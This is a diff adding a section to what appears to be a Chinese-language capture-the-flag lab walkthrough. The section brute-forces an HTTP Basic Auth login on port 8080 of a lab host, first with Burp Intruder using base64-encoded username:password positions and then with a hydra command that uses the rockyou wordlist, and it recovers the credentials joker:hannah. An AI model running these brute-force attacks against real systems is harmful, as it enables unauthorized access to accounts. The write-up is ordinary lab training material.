@@ -62,3 +62,47 @@ nmap -p- 172.16.168.135 -A
 
 
 
+
+
+
+
+### 2. 爆破 密码
+
+> 枚举是关键。
+
+```shell
+1. 80 端口  单页没有任何信息
+2. 8080 端口 需要登陆用户名和密码
+```
+
+1. burp爆破
+
+> burp 抓包
+
+```shell
+# 登陆信息 加密了
+Authorization: Basic YWRtaW46MTIz
+
+# 发送到Decoder  Base64解密
+admin:123
+用户名：密码=>base64加密
+
+# 发送到intruder爆破 type: Custom inerator自定义模式
+position： 1 => 用户名
+position : 2 => :
+position : 3 => 密码
+# 可以使用字典。/usr/share/wordlists
+# payload processing => Eecode => base64-decode 
+start atttack
+
+# 看长度不同的包，发送到decoder解密。就是我们的密码和账号
+joker:hannah
+```
+
+2. hydra爆破
+
+```shell
+# -L 用户名文件 只能IP
+hydra -l joker -P /usr/share/wordlists/rockyou.txt 172.16.168.135 -s 8080 http-get
+```
+
